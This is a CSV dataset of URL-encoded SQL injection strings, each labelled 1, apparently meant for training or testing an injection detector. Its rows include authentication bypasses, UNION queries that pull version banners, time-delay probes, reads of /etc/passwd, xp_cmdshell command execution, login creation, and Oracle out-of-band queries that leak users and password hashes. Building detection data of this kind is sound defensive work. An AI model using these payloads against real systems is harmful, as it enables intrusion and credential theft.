Query,Label
" selec%74 %2a %66%72%6fm %75%73%65%72%73 w%68%65re %69%64  %3d  %3%3%3%31 %6f%72 ""%2e%2c%22 %6f%72 %3%3%3%31  %3d  %3%3%3%31 %2d%2d %3%3%3%31",1
%61d%6di%6e' %23,1
" %73%65%6ce%63t %2a %66%72%6f%6d u%73e%72%73 %77%68er%65 %69%64  %3d  %3%31 %3c%40%24%5f %75n%69%6fn %73%65%6ce%63t %3%3%31,v%65%72s%69%6f%6e  %28    %29   %2d%2d %3%31",1
 s%65l%65%63t %2a %66%72om %75%73e%72%73 %77here %69%64  %3d  %3%3%3%31 o%72 %22%2c  %28  %22 o%72 %3%3%3%31  %3d  %3%3%3%31 %2d- %3%3%3%31,1
 %73%65l%65%63%74 %2a %66%72%6f%6d us%65rs %77h%65%72e %69%64  %3d  %3%3%3%31 %6f%72 %22%2c{%22 %6f%72 %3%3%3%31  %3d  %3%3%3%31 %2d%2d %3%3%3%31,1
" un%69%6fn %73el%65%63%74 1,lo%61%64%5ffi%6c%65  %28  '%2fetc%2f%70%61%73sw%64'  %29  %2c%31,1,%31%3b",1
%22  %29  ;wait%66or %64%65%6c%61%79 '%30:%30%3a_%5fti%6de__'%2d%2d,1
 %6f%72 %27%75%6e%75s%75al'   %3d   %27%75%6e%75s%75al',1
"i%6es%65%72t %69%6et%6f %6d%79%73%71%6c%2e%75%73%65%72   %28  %75%73%65%72%2c %68%6f%73%74%2c passwor%64  %29   va%6cues   %28  'n%61m%65', 'localhos%74', passwor%64  %28  %27%70%61%73%73%31%32%33%27   %29    %29   ",1
%61dmi%6e%22 %6f%72 %22%31%22  %3d  %22%31%22/*,1
 se%6ce%63%74 %2a f%72o%6d %75%73%65%72%73 %77%68e%72%65 i%64  %3d  %3%3%3%3%31 %6fr %22%3%3%3%3%31  %28  %22  %3d  %3%3%3%3%31 %6fr %3%3%3%3%31  %3d  %3%3%3%3%31 %2d- %3%3%3%3%31,1
" s%65%6c%65%63t %2a f%72om use%72s %77%68%65%72%65 i%64  %3d  %3%31 %6fr \<%3%31 %75%6ei%6fn s%65%6c%65%63t %3%3%31,%40@%76%65%72%73i%6f%6e %2d%2d %3%31",1
%6cik%65,1
%6fr u%73ername lik%65 %63%68ar  %28  %33%37  %29  %3b,1
 %29    %29    %6fr pg_s%6ceep  %28  %5f%5f%74%69%6d%65%5f%5f  %29  %2d%2d,1
s%65le%63t %2a %66%72om us%65r%73 %77h%65%72%65 %69d  %3d  %3%3%3%31 %6fr %24%2b<%5c %6fr %3%3%3%31  %3d  %3%3%3%31 %2d- %3%3%3%31,1
%6f%72 %%33%33  %%33d  %%33%33,1
 s%65%6c%65%63t %2a %66%72%6fm us%65%72%73 %77h%65r%65 %69%64  %3d  %3%3%3%31 %6f%72 %22  %28  .%22 %6f%72 %3%3%3%31  %3d  %3%3%3%31 %2d%2d %3%3%3%31,1
%73%65le%63%74 %2a %66%72o%6d %75%73%65%72%73 %77%68%65r%65 %69d  %3d  %3%3%3%3%31 %6f%72   %28  %24%2b  %29    %3d  %3%3%3%3%31 %6f%72 %3%3%3%3%31  %3d  %3%3%3%3%31 %2d- %3%3%3%3%31,1
e%78e%63 %73%70,1
" %73%65%6cect %2a %66r%6fm %75%73%65%72s wher%65 i%64  %3d  %3%31 %6fr %5c%2b%3c%24 %75%6e%69%6f%6e %73%65%6cect %3%31,%40%40ver%73io%6e %2d%2d %3%31",1
%73ele%63t %2a %66r%6f%6d %75%73%65%72%73 %77h%65%72e %69%64  %3d  %3%3%3%31 o%72 %5c%3c%24 o%72 %3%3%3%31  %3d  %3%3%3%31 %2d%2d %3%3%3%31,1
 %73%65%6c%65%63%74 %2a %66%72%6f%6d %75%73%65%72s %77%68%65r%65 i%64  %3d  %31%2e%26&%31 %75%6e%69%6f%6e %73%65%6c%65%63%74 %3%31%2c%76%65%72s%69%6f%6e  %28    %29   -%2d %31,1
%6%31%64%6d%69n%27 o%72 %31  %3d  %31/%2a,1
%61' %77%61%69%74%66%6f%72 d%65l%61%79 %270%3a0%3a%31%30'-%2d,1
" s%65%6c%65c%74 %2a %66%72%6f%6d u%73er%73 %77h%65re %69%64  %3d  %3%31 %2b  %28  %5c  %29   %75%6e%69%6fn s%65%6c%65c%74 nul%6c,%40@%76%65%72%73io%6e %2d- %3%31",1
" %73ele%63%74 %2a f%72%6fm %75se%72%73 wh%65%72%65 i%64  %3d  %3%31 %75ni%6f%6e %73ele%63%74 .%3%31$_,version  %28    %29   %2d%2d %3%31",1
%6%31n%64 %31 %69%6e   %28  %73elec%74 va%72 fr%6f%6d %74emp  %29  %2d%2d,1
%68i'  %29   %6fr   %28  '%61'  %3d  %27%61,1
 %6%3%31n%64 %3%31  %3d  %75%74%6c%5f%69%6ea%64%64%72.%67%65%74%5f%68%6f%73%74%5f%6%31d%64%72%65%73%73   %28    %28   %73el%65ct %64%69%73%74%69%6ec%74  %28  %63olumn_name  %29   %66rom   %28  %73el%65ct %64%69%73%74%69%6ec%74  %28  %63olumn_name  %29  %2c rownu%6d %6%31s %6ci%6d%69%74 %66rom al%6c_%74%6%31b%5fc%6fl%75%6d%6es  %29   wh%65re %6ci%6d%69%74  %3d  %3%31   %29    %29    %6%3%31n%64 %27%69%27  %3d  '%69,1
"ad%6di%6e"" %6f%72 %3%31  %3d  %3%31",1
%22  %29   %6fr %74%72ue%2d%2d,1
 %73%65%6c%65%63%74 %2a %66%72o%6d use%72s %77%68%65%72%65 %69%64  %3d  %27%31%27 %6f%72 %24 %2e  %3d  %31 %75%6e%69%6fn %73%65%6c%65%63%74 %3%31%2c@%40%76er%73io%6e %2d- %31%27,1
 %73%65le%63%74 %2a %66%72%6fm us%65rs w%68ere %69d  %3d  %3%3%3%31 %6f%72 %22  %28  {%22 %6f%72 %3%3%3%31  %3d  %3%3%3%31 %2d%2d %3%3%3%31,1
%31  %29   %6fr p%67%5fs%6c%65%65%70  %28  __%74ime%5f_  %29  %2d-,1
" %73%65%6ce%63%74 %2a f%72o%6d %75%73%65%72s w%68%65%72e i%64  %3d  %3%3%3%31 %6fr ""%7b%2e%22 %6fr %3%3%3%31  %3d  %3%3%3%31 %2d- %3%3%3%31",1
%22  %29   %6f%72 s%6ceep  %28  %5f%5ftime%5f_  %29    %3d  %22,1
sele%63%74 %2a %66%72%6fm use%72s w%68%65%72e %69d  %3d  %3%3%31.%3c@. %6f%72 %3%3%31  %3d  %3%3%31 %2d%2d %3%3%31,1
%61%64%6d%69%6e%22  %29   o%72   %28  %221%22  %3d  %221%22--,1
" %73%65%6c%65%63%74 %2a f%72%6f%6d us%65rs w%68ere %69%64  %3d  %31<@%2e%2e %75%6ei%6f%6e %73%65%6c%65%63%74 %31,%76ersion  %28    %29   %2d%2d %31",1
%3b %65xe%63 xp%5fre%67%72%65ad,1
" %73el%65c%74 %2a %66%72o%6d use%72%73 %77%68e%72e %69%64  %3d  %27%3%3%31' %2b %40 %31 %75%6ei%6f%6e %73el%65c%74 %3%31,versio%6e  %28    %29   %2d%2d %3%31'",1
%73%65%6c%65%63%74 %2a %66rom user%73 wher%65 %69d  %3d  %3%3%3%31 %2b \%2b%%3%3%3%31 %6f%72 %3%3%3%31  %3d  %3%3%3%31 %2d%2d %3%3%3%31,1
" %73%65%6c%65%63t %2a %66%72%6f%6d %75se%72s %77%68%65%72%65 %69%64  %3d  %3%3%3%31 o%72 "";%3%3%3%31"" o%72 %3%3%3%31  %3d  %3%3%3%31 %2d- %3%3%3%31",1
" %73e%6c%65%63%74 %2a %66%72%6fm u%73e%72s %77%68e%72e %69d  %3d  %3%3%3%31 %6f%72 ""%25&"" %6f%72 %3%3%3%31  %3d  %3%3%3%31 %2d- %3%3%3%31",1
%3%3%31 %6%3%31%6e%64 %3%3%31  %3d  %3%3%31,1
o%72 %3%30  %3d  %3%30 %23,1
%75%6e%69%6f%6e %73el%65ct %2a fro%6d %75s%65%72%73 %77%68%65%72%65 %6c%6f%67%69%6e   %3d   %63%68%61%72 %2e%2e%2e,1
" sele%63%74 %2a f%72%6fm %75sers %77h%65%72%65 %69%64  %3d  %3%31 u%6eion sele%63%74 %3%3%31|%7c@,v%65rs%69on  %28    %29   -%2d %3%31",1
ad%6d%69n%27  %29   o%72 %271'  %3d  %271'--,1
%31%3b%73%65%6c%65%63%74 %2a,1
" %73%65l%65%63t %2a %66r%6f%6d u%73e%72s %77here %69d  %3d  %3%3%3%31 %6f%72 ""%7b%3b%22 %6f%72 %3%3%3%31  %3d  %3%3%3%31 %2d- %3%3%3%31",1
%78%27 an%64 %31  %3d    %28  sel%65%63t %63o%75%6et  %28  %2a  %29   %66%72%6f%6d t%61%62%6e%61m%65  %29  %3b %2d%2d,1
" sel%65%63t %2a %66%72%6f%6d %75%73%65%72%73 wh%65r%65 i%64  %3d  %271%27 %6f%72 ""%22%3c%40 %75n%69%6fn sel%65%63t %31,%76%65%72%73%69%6f%6e  %28    %29   -%2d 1%27",1
" %73%65%6ce%63%74 %2a %66%72om u%73e%72%73 %77here i%64  %3d  %3%3%3%31 %6f%72 %22?%2c"" %6f%72 %3%3%3%31  %3d  %3%3%3%31 %2d%2d %3%3%3%31",1
" sel%65ct %2a %66%72%6f%6d %75%73%65%72%73 w%68%65%72e %69%64  %3d  %27%31%27 %7c|%3%31 %75%6ei%6f%6e sel%65ct %31,ba%6en%65r %66%72%6f%6d v%24vers%69o%6e w%68%65%72e %72%6f%77%6e%75%6d  %3d  %31 %2d%2d %31%27",1
"%3%31 %6fr be%6e%63%68m%6%31%72%6b  %28  %3%310%300%300%30%30,%6d%64%35  %28  %3%31   %29    %29   %23",1
%70ro%63%65%64ur%65,1
%6f%72 %27%27  %3d  %27,1
 an%64 %31  %3d  ut%6c%5finadd%72.g%65%74%5fho%73t_%61d%64ress   %28    %28   %73%65%6c%65%63%74 s%79%73%2e%6c%6f%67%69%6e%5f%75s%65r fro%6d %64ual   %29    %29    an%64 %27i%27  %3d  %27i,1
 %6%31%6ed %31  %3d  %75%74%6c%5f%69na%64%64%7%32.%67e%74_h%6fs%74%5fa%64%64%7%32e%73s   %%328    %%328   s%65l%65%63%74 d%69s%74i%6ect  %%328  %75s%65r%6e%61%6d%65  %%329   %66%7%32o%6d   %%328  s%65l%65%63%74 d%69s%74i%6ect  %%328  %75s%65r%6e%61%6d%65  %%329  %%32c rownu%6d %61%73 %6c%69%6d%69%74 %66%7%32o%6d %73y%73%%32e%61l%6c_%75sers  %%329   %77%68e%7%32%65 %6c%69%6d%69%74  %3d  %32   %%329    %%329    %6%31%6ed %27i'  %3d  %27%69,1
%5c%27; %64%65sc %75%73er%73; %2d-,1
 %73%65%6c%65%63%74 %2a fr%6fm us%65%72s %77%68%65%72%65 i%64  %3d  %3%3%31 o%72   %28  \%2e  %29    %3d  %3%3%31 %75%6e%69%6f%6e %73%65%6c%65%63%74 %3%3%31%2c%40%40v%65%72si%6f%6e %2d- %3%3%31,1
se%6cect %2a f%72%6f%6d u%73%65%72%73 %77%68%65re %69%64  %3d  '%3%3%3%3%31%27 o%72 %24 %3%3%3%31  %3d  %3%3%3%31 o%72 %3%3%3%31  %3d  %3%3%3%31 %2d%2d %3%3%3%31%27,1
%22 o%72 %22%22^%22,1
"""%2d""",1
" se%6c%65%63%74 %2a %66r%6fm %75%73%65%72%73 %77%68%65%72%65 %69d  %3d  %3%3%31 o%72 \%3c   %3d  %3%3%31 %75%6e%69%6f%6e se%6c%65%63%74 %3%3%31,%40%40%76%65%72si%6f%6e -%2d %3%3%31",1
" %73%65%6c%65%63%74 %2a %66%72%6f%6d us%65rs w%68%65%72%65 %69d  %3d  %3%31 %75n%69%6f%6e %73%65%6c%65%63%74 %3%31<@$,v%65rsion  %28    %29   %2d%2d %3%31",1
" %73el%65%63%74 %2a %66%72%6f%6d %75%73%65%72%73 %77he%72%65 %69%64  %3d  %3%31 %2a\ %75%6e%69%6fn %73el%65%63%74 %6e%75%6c%6c,@@%76%65%72%73%69%6f%6e -%2d %3%31",1
" %73%65%6cec%74 %2a %66%72%6f%6d %75%73%65%72%73 %77%68%65%72%65 %69%64  %3d  %27%3%31' %6f%72 %21<@ %75%6e%69%6f%6e %73%65%6cec%74 1,vers%69on  %28    %29   -%2d %31'",1
 sel%65c%74 %2a %66r%6fm u%73%65%72%73 w%68%65%72e %69%64  %3d  %3%3%3%31 %6f%72 %22.%%22 %6f%72 %3%3%3%31  %3d  %3%3%3%31 %2d%2d %3%3%3%31,1
%61%64%6d%69%6e'/%2a,1
 %73%65%6c%65%63%74 %2a %66rom %75%73%65r%73 w%68%65%72%65 %69%64  %3d  %3%3%3%31 o%72 %22  %28  #%22 o%72 %3%3%3%31  %3d  %3%3%3%31 %2d%2d %3%3%3%31,1
||u%74l%5fh%74%74%70.%72%65%71uest,1
 %6%3%31%6e%64 %3%31  %3d  %75%74l%5f%69%6e%6%31d%64%72%2eget%5f%68%6f%73%74%5f%6%31%64%64%72%65s%73   %28    %28   %73elect %64%69%73%74%69%6e%63%74  %28  %74%6%31%62%6c%65_%6eame  %29   f%72om   %28  %73elect %64%69%73%74%69%6e%63%74  %28  %74%6%31%62%6c%65_%6eame  %29  %2c %72%6f%77%6e%75%6d a%73 l%69%6d%69t f%72om s%79s.%6%31l%6c_t%6%31%62le%73  %29   wh%65%72%65 l%69%6d%69t  %3d  %3%31   %29    %29    %6%3%31%6e%64 %27i'  %3d  %27%69,1
 sel%65ct %2a %66%72%6f%6d %75%73%65r%73 whe%72e %69%64  %3d  %27%31%27<@.%2e u%6ei%6fn sel%65ct %31%2cv%65%72si%6f%6e  %28    %29   %2d%2d %31',1
"%22   %29    %29    %6f%72 %62%65%6ec%68%6d%6%31r%6b  %28  %31000%30%30%30%30,md5  %28  %31   %29    %29   %23",1
" sele%63t %2a %66%72%6f%6d %75%73e%72%73 %77%68%65%72%65 %69%64  %3d  %3%31 <%40%2e%24 u%6ei%6f%6e sele%63t %3%3%31,version  %28    %29   -%2d %3%31",1
" s%65%6ce%63%74 %2a fr%6f%6d %75%73%65%72%73 %77he%72%65 %69d  %3d  %3%3%31 o%72 %24 %2e  %3d  %3%3%31 u%6e%69on s%65%6ce%63%74 %3%3%31,@%40%76%65rsion -%2d %3%3%31",1
%73%65%6c%65%63%74 %2a %66%72om u%73%65r%73 %77%68%65%72%65 %69%64  %3d  %27%3%3%31%27 <@.%24 %6f%72 %3%31  %3d  %3%31 %2d%2d %3%3%31%27,1
%31 %75%6e%69/%2a%2a%2fo%6e %73e%6cect a%6c%6c %66%72%6fm %77%68%65%72%65,1
 s%65%6c%65ct %2a %66ro%6d u%73e%72%73 %77%68%65%72%65 %69%64  %3d  %3%31 +%24 %2e u%6e%69%6f%6e s%65%6c%65ct %6e%75%6c%6c%2c%40%40%76%65r%73%69%6f%6e -%2d %3%31,1
" %73%65%6c%65%63%74 %2a %66%72%6fm %75%73%65%72s w%68e%72e %69%64  %3d  %3%31 o%72 %3%3%31#""%3f u%6e%69o%6e %73%65%6c%65%63%74 nu%6c%6c%2c%76%65r%73%69%6fn  %28    %29   -%2d %3%31",1
%61%64%6d%69%6e%27  %29   %6f%72 %271'  %3d  %271'#,1
%7c|utl_http.request  %28  '%68t%74%70%3a%2f%2f1%39%32%2e%31%36%38.%31%2e%31%2f'  %29  %7c%7c',1
o%72 '%37%36%35%39%27  %3d  '%37%36%35%39,1
" %73elect %2a %66rom %75s%65%72%73 %77%68%65%72%65 %69%64  %3d  %3%3%3%31 %6f%72 ""{@%22 %6f%72 %3%3%3%31  %3d  %3%3%3%31 %2d%2d %3%3%3%31",1
" %73e%6c%65c%74 %2a f%72om us%65%72s %77h%65re %69%64  %3d  %3%31 %75%6e%69%6f%6e %73e%6c%65c%74 +!<%3%31,version  %28    %29   -%2d %3%31",1
 %%36%31%%36e%%364 %31  %3d  utl_ina%%364%%364r%2eget_%%368ost_a%%364d%72ess   %28    %28   sele%%363t %%364%%369%73%74%%369%%36e%%363%74  %28  %%367ran%74ed_role  %29   %%36%36%72%%36f%%36d   %28  sele%%363t %%364%%369%73%74%%369%%36e%%363%74  %28  %%367ran%74ed_role  %29  %2c r%%36fwn%75%%36d %%361%73 %%36c%%369mit %%36%36%72%%36f%%36d %%364%%362%%361_%72o%%36ce%5f%70%72%%369%7%36%73 whe%72%%365 grante%%365  %3d  %73%79%73%2e%%36c%%36f%%367%%369%%36e%75%73%%365%72  %29   whe%72%%365 %%36c%%369mit  %3d  %36   %29    %29    %%36%31%%36e%%364 %27i%27  %3d  %27i,1
 %73%65%6c%65%63%74 %2a %66rom %75%73e%72s %77%68%65re i%64  %3d  %3%3%3%31 %6fr %22  %28  @%22 %6fr %3%3%3%31  %3d  %3%3%3%31 -%2d %3%3%3%31,1
%6f%72 t%72%75%65%2d%2d,1
" se%6c%65%63t %2a fro%6d %75ser%73 %77h%65r%65 %69%64  %3d  %3%31 %75%6e%69%6fn se%6c%65%63t !<%3%31,version  %28    %29   %2d%2d %3%31",1
" %73%65%6c%65%63%74 %2a fr%6fm use%72%73 w%68e%72%65 %69d  %3d  %27%31%27 %75n%69%6fn %73%65%6c%65%63%74 \#,%40%40v%65r%73%69%6f%6e %2d- %31%27",1
" s%65l%65%63%74 %2a fr%6fm %75%73%65r%73 wher%65 %69%64  %3d  %3%31 %6f%72 %3%3%31%23""%7b %75%6e%69%6f%6e s%65l%65%63%74 %3%3%31,version  %28    %29   %2d%2d %3%31",1
%22 %6fr %74ru%65%2d%2d,1
%73e%6c%65%63%74 %2a f%72%6fm %75se%72s w%68%65re %69%64  %3d  %3%3%31%2e %6f%72 %3%3%31  %3d  %3%3%31 %2d%2d %3%3%31,1
" %73%65%6c%65%63%74 %2a %66%72%6f%6d u%73%65rs %77%68%65%72e i%64  %3d  %3%3%31 %6fr @%23""%2c  %3d  %3%3%31 un%69on %73%65%6c%65%63%74 %3%3%31%2c%76%65%72sion  %28    %29   %2d%2d %3%3%31",1
" %73%65%6ce%63%74 %2a f%72%6fm %75se%72%73 w%68%65%72%65 %69%64  %3d  %3%3%3%31 %6f%72 "";@%22 %6f%72 %3%3%3%31  %3d  %3%3%3%31 -%2d %3%3%3%31",1
%e2%80 %6f%72 %%33%33  %%33d  %%33%33 %2d%2d,1
 a%6e%64 %31  %3d  %75tl%5finaddr%2ege%74%5fho%73t_%61d%64%72ess   %28    %28   %73elec%74 %67l%6fb%61%6c%5f%6e%61%6d%65 %66r%6f%6d %67l%6fb%61%6c%5f%6e%61%6d%65   %29    %29    a%6e%64 %27%69%27  %3d  '%69,1
 %73%65%6c%65%63t %2a fro%6d %75%73%65%72%73 %77here %69%64  %3d  %3%3%31 +%3%3%31 un%69%6f%6e %73%65%6c%65%63t %6e%75%6c%6c%2c%62%6%3%31%6e%6e%65%72 fro%6d v%24version %77here %72o%77%6e%75%6d  %3d  %3%3%31 %2d%2d %3%3%31,1
" %73%65%6c%65%63%74 %2a %66%72%6f%6d %75%73%65%72%73 %77%68%65%72%65 %69d  %3d  %3%3%3%3%31 %6f%72 "",%2c""  %3d  %3%3%3%3%31 %6f%72 %3%3%3%3%31  %3d  %3%3%3%3%31 -%2d %3%3%3%3%31",1
" %73el%65ct %2a f%72o%6d u%73ers %77%68%65%72%65 %69d  %3d  %3%31 %2b $%2b%%3%31 un%69%6fn %73el%65ct nul%6c,@@ver%73ion %2d%2d %3%31",1
" %73%65%6c%65c%74 %2a fr%6fm %75%73%65%72s wh%65r%65 %69%64  %3d  %3%31 %6f%72 %3%31%23""? %75n%69o%6e %73%65%6c%65c%74 versio%6e  %28    %29  ,versio%6e  %28    %29   %2d- %3%31",1
 %73%65%6c%65%63t %2a fr%6f%6d u%73e%72%73 wh%65%72e i%64  %3d  %3%3%3%31 %6f%72 %22  %29  %3%3%3%31%22 %6f%72 %3%3%3%31  %3d  %3%3%3%31 %2d%2d %3%3%3%31,1
 %6fr ui%64 %6ci%6b%65 %27%25,1
%73%65le%63%74 %2a %66rom %75%73%65%72%73 %77h%65r%65 %69d  %3d  '%3%3%31%27 <@&%3%3%31 %6fr %3%31  %3d  %3%31 -%2d %3%31%27,1
" se%6cect %2a f%72om %75s%65%72%73 %77%68%65%72%65 %69%64  %3d  %27%31' un%69o%6e se%6cect !<1,ver%73%69on  %28    %29   -%2d %31'",1
%323 o%72 %31  %3d  %3%31; -%2d,1
" %73%65%6c%65%63%74 %2a %66%72%6f%6d u%73e%72s %77h%65re %69%64  %3d  %3%31 o%72 %5c%3c\%2e u%6e%69%6f%6e %73%65%6c%65%63%74 %3%31,@%40%76%65r%73i%6fn %2d%2d %3%31",1
 %73%65%6c%65%63%74 %2a %66r%6f%6d %75%73%65%72%73 w%68e%72%65 %69%64  %3d  %3%3%3%3%31 %6f%72 %22%7b  %28  %22  %3d  %3%3%3%3%31 %6f%72 %3%3%3%3%31  %3d  %3%3%3%3%31 -%2d %3%3%3%3%31,1
 %73%65l%65c%74 %2a f%72%6fm %75sers %77%68e%72%65 %69d  %3d  %3%3%3%31 %6f%72 %22%%5f%22 %6f%72 %3%3%3%31  %3d  %3%3%3%31 -%2d %3%3%3%31,1
sel%65ct %2a fro%6d us%65r%73 whe%72e %69%64  %3d  %3%3%3%31 %2b   %28  %5c%2e  %29   %6fr %3%3%3%31  %3d  %3%3%3%31 -%2d %3%3%3%31,1
" %73%65%6c%65%63%74 %2a %66%72%6f%6d us%65%72s w%68%65%72%65 %69%64  %3d  '%3%31' %75%6eio%6e %73%65%6c%65%63%74 %5c,@@ve%72si%6f%6e %2d- %31'",1
%30 %6fr %3%31  %3d  %3%31,1
s%65le%63t %2a %66r%6fm use%72s w%68er%65 %69d  %3d  %3%3%3%31 %26@ %6fr %3%3%3%31  %3d  %3%3%3%31 -%2d %3%3%3%31,1
"a%64m%69n""  %29   %6f%72 %22%31""  %3d  ""%31",1
%73e%6c%65%63%74 %2a %66%72%6f%6d %75%73%65%72%73 wh%65r%65 %69%64  %3d  %3%3%3%3%31 %6f%72 \%3c   %3d  %3%3%3%3%31 %6f%72 %3%3%3%3%31  %3d  %3%3%3%3%31 %2d%2d %3%3%3%3%31,1
 se%6c%65ct %2a %66%72%6f%6d %75%73%65%72%73 %77%68%65%72%65 %69%64  %3d  %3%3%3%31 o%72 %22%3f%3f%22 o%72 %3%3%3%31  %3d  %3%3%3%31 %2d%2d %3%3%3%31,1
 an%64 %31  %3d  u%74%6c%%35fin%61%64%64r.g%6%35%74%%35f%68ost_a%64d%72es%73   %28    %28   %73%6%35%6cec%74 distin%63t  %28  p%61%73%73%77or%64  %29   fro%6d   %28  %73%6%35%6cec%74 distin%63t  %28  p%61%73%73%77or%64  %29  %2c ro%77%6e%7%35m %61%73 %6c%69%6d%69%74 fro%6d sys.%7%35ser$  %29   w%68%6%35%72%6%35 %6c%69%6d%69%74  %3d  %35   %29    %29    an%64 %27%69%27  %3d  %27%69,1
 an%64 %31  %3d  %%375t%6c_%69n%61%64d%%372%2ege%%374%5fhos%%374_addre%%373%%373   %28    %28   s%65lec%%374 %64i%%373t%69%6ec%%374  %28  c%6flumn_na%6d%65  %29   %66r%6fm   %28  s%65lec%%374 %64i%%373t%69%6ec%%374  %28  c%6flumn_na%6d%65  %29  %2c %%372%6f%%37%37%6e%%375%6d %61s li%6d%69t %66r%6fm %61%6c%6c%5f%%374%61%62%5f%63%6f%6c%%375%6d%6e%%373  %29   w%68%65%%372%65 li%6d%69t  %3d  %37   %29    %29    an%64 %27%69'  %3d  %27%69,1
%26apos%3b %6f%72,1
sqlv%75l%6e;,1
%73el%65%63t %2a f%72%6fm use%72s %77%68%65%72%65 %69d  %3d  %3%3%3%31 %2b $%2b%$ %6f%72 %3%3%3%31  %3d  %3%3%3%31 -%2d %3%3%3%31,1
%73%65%6c%65%63%74 %2a f%72%6f%6d %75%73%65r%73 %77h%65re %69%64  %3d  %27%3%31%27 %2b $%2b%\ %6f%72 %3%31  %3d  %3%31 -%2d %3%3%31%27,1
%22 %6fr %22%22*%22,1
%68%69 %6fr %3%31  %3d  %3%31 %2d%2d%22,1
" %73e%6c%65%63%74 %2a %66%72%6f%6d %75%73%65%72%73 %77he%72e %69%64  %3d  %3%3%31%2e %75%6e%69%6f%6e %73e%6c%65%63%74 nu%6cl,banne%72 %66%72%6f%6d %76%24%76%65%72%73%69%6fn %77he%72e rown%75m  %3d  %3%31 %2d%2d %3%31",1
%3b e%78e%63 m%61ster..xp%5fcmdshe%6cl '%70ing %31%37%32%2e%31%30%2e%31%2e%32%35%35%27%2d%2d,1
 %73%65%6ce%63%74 %2a %66%72%6f%6d u%73%65%72%73 %77%68ere %69%64  %3d  '%3%3%3%31%27 %6f%72 %3%3%31^  %3d  %3%31 %75%6e%69%6fn %73%65%6ce%63%74 %3%3%31%2c%62%6%31%6e%6e%65r %66%72%6f%6d v%24%76e%72s%69o%6e %77%68ere r%6fw%6e%75%6d  %3d  %3%31 %2d%2d %3%3%31%27,1
 %73%65%6c%65%63%74 %2a %66%72%6f%6d use%72%73 %77h%65%72%65 %69%64  %3d  %27%31' %75%6e%69%6f%6e %73%65%6c%65%63%74 %22%3f%22%5f%2c%76%65%72%73%69o%6e  %28    %29   -%2d %31',1
se%6ce%63%74 %2a %66%72%6f%6d information_schem%61.tables--,1
selec%74 %2a f%72om %75%73%65%72s w%68e%72%65 %69%64  %3d  %3%3%3%31 %6fr %5c%3c%5c%2e %6fr %3%3%3%31  %3d  %3%3%3%31 %2d%2d %3%3%3%31,1
   %28  %73%65%6c%65%63%74 %74%6f%70 %31,1
%e3%bd %6fr %3%31  %3d  %3%31 %2d%2d,1
%61%27 -%2d,1
 o%72 %3%31  %3d  %3%31 %2f%2a,1
" s%65lect %2a f%72%6f%6d %75s%65%72%73 wher%65 i%64  %3d  %3%31 o%72 %3%3%31%23%22, %75%6e%69%6fn s%65lect %6e%75ll,ve%72sion  %28    %29   %2d%2d %3%31",1
" %73%65%6c%65%63%74 %2a fr%6fm user%73 %77%68%65%72%65 i%64  %3d  %27%31%27 %75%6e%69on %73%65%6c%65%63%74 %24 %2e,%40%40%76%65%72%73%69%6fn %2d- %31'",1
%2d%2d,1
exe%63 %73%70%5f%61%64dl%6fgin 'n%61%6d%65%27 %2c %27pa%73s%77%6frd',1
" %73%65%6c%65%63%74 %2a f%72om %75%73%65%72%73 %77%68%65r%65 i%64  %3d  %3%3%31   %75%6e%69on %73%65%6c%65%63%74 null,b%6%3%31nner f%72om v$v%65r%73io%6e %77%68%65r%65 r%6fw%6eum  %3d  %3%3%31 %2d- %3%3%31",1
0x776%3169746%366f7220%364656c617920%32%37303a%3303a31302700 exe%63  %28  %40%73  %29 ,1
 %73%65%6c%65%63%74 %2a %66%72%6fm %75s%65r%73 w%68ere %69%64  %3d  %3%3%3%31 %6fr %22%2e  %29  %22 %6fr %3%3%3%31  %3d  %3%3%3%31 -%2d %3%3%3%31,1
 %73e%6c%65%63%74 %2a f%72om %75s%65rs %77%68%65%72%65 %69%64  %3d  %3%3%31 %6fr %40%3c%40  %3d  %3%3%31 uni%6fn %73e%6c%65%63%74 %3%3%3%31%2cv%65r%73%69%6fn  %28    %29   %2d- %3%3%31,1
%67%72o%75%70 %62y us%65rid hav%69ng %31  %3d  %31%2d-,1
" selec%74 %2a %66%72%6f%6d use%72s wh%65r%65 %69%64  %3d  %3%31 %2b \%2b%%3%31 u%6e%69%6f%6e selec%74 n%75ll,@%40%76e%72si%6fn %2d- %3%31",1
s%65%6cect %2a f%72om %75%73%65rs whe%72%65 %69d  %3d  %3%3%3%31 %2a%3%3%3%31 %6f%72 %3%3%3%31  %3d  %3%3%3%31 %2d%2d %3%3%3%31,1
